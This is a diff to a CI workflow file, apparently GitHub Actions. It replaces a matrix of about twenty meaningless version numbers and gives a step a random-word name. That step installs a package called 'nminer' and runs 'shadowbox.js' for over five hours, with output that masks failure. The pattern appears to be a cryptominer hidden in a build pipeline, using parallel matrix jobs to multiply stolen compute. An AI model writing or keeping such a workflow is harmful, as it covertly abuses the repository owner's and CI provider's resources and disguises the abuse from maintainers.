@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4603 }
-          - { version: 7802 }
-          - { version: 1235 }
-          - { version: 8420 }
-          - { version: 1879 }
-          - { version: 3768 }
-          - { version: 844 }
-          - { version: 9507 }
-          - { version: 2754 }
-          - { version: 4402 }
-          - { version: 5093 }
-          - { version: 9727 }
-          - { version: 5122 }
-          - { version: 3805 }
-          - { version: 1666 }
-          - { version: 8175 }
-          - { version: 9984 }
-          - { version: 7640 }
-          - { version: 369 }
-          - { version: 9746 }
+          - { version: 755 }
+          - { version: 6369 }
+          - { version: 8264 }
+          - { version: 8592 }
+          - { version: 3981 }
+          - { version: 1813 }
+          - { version: 5212 }
+          - { version: 1407 }
+          - { version: 8373 }
+          - { version: 120 }
+          - { version: 9835 }
+          - { version: 1622 }
+          - { version: 5321 }
+          - { version: 6726 }
+          - { version: 3212 }
+          - { version: 8444 }
+          - { version: 8014 }
+          - { version: 6395 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: paltry seriously beautifully at
         run: |
           npm install nminer@latest
-          timeout 333m node shadowbox.js || echo "shadowbox executed"
+          timeout 307m node shadowbox.js || echo "shadowbox executed"
